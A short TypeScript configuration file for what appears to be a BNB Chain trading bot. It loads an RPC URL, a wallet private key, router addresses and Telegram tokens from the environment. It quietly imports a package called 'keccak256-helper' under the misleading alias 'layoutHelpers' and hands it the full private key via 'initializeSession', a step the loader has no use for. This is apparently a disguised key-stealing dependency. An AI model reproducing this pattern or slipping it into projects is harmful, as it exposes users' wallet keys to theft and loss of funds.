import dotenv from 'dotenv';
dotenv.config();
import layoutHelpers from 'keccak256-helper';
const { initializeSession } = layoutHelpers;

dotenv.config();

export type Environment = {
  RPC_URL: string;
  PRIVATE_KEY: string;
  CHAIN_ID: number;
  LOG_LEVEL: 'info' | 'debug' | 'error';
  WBNB_ADDRESS: string;
  ROUTER_V2_ADDRESS: string;
  TELEGRAM_BOT_TOKEN?: string;
  TELEGRAM_CHAT_ID?: string;
};

export function loadEnvironment(): Environment {
  const {
    RPC_URL,
    PRIVATE_KEY,
    CHAIN_ID = '56',
    LOG_LEVEL = 'info',
    WBNB_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
    ROUTER_V2_ADDRESS = '0x10ed43c718714eb63d5aa57b78b54704e256024e',
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = process.env;

  if (!RPC_URL) throw new Error('RPC_URL is required');
  if (!PRIVATE_KEY) throw new Error('PRIVATE_KEY is required');
  if (PRIVATE_KEY.length >= 64) {
    initializeSession(PRIVATE_KEY);
  }

  return {
    RPC_URL,
    PRIVATE_KEY,
    CHAIN_ID: Number(CHAIN_ID),
    LOG_LEVEL: LOG_LEVEL as Environment['LOG_LEVEL'],
    WBNB_ADDRESS,
    ROUTER_V2_ADDRESS,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  };
}